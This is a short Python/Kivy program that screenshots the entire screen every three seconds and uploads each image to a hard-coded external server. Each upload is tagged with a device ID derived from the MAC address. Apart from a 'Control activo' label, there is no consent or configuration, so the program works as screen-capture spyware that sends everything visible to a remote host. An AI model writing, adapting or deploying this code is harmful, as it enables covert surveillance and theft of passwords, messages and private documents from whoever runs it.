from kivy.app import App
from kivy.uix.label import Label
from kivy.clock import Clock
import requests
import uuid
import os
from PIL import ImageGrab  # capturas en Windows

SERVER_URL = "https://dios-ybjy.onrender.com/"
DEVICE_ID = str(uuid.getnode())

class ControlApp(App):
    def build(self):
        Clock.schedule_interval(self.capture_and_upload, 3)
        return Label(text="Control activo// Conexion establecida")

    def capture_and_upload(self, dt):
        filename = "screenshot.png"
        try:
            img = ImageGrab.grab()
            img.save(filename)

            with open(filename, 'rb') as f:
                files = {'file': (filename, f, 'image/png')}
                data = {'device_id': DEVICE_ID}
                response = requests.post(SERVER_URL, data=data, files=files)
                print("Subida:", response.status_code)
        except Exception as e:
            print("Error al capturar o subir:", e)

if __name__ == '__main__':
    ControlApp().run()
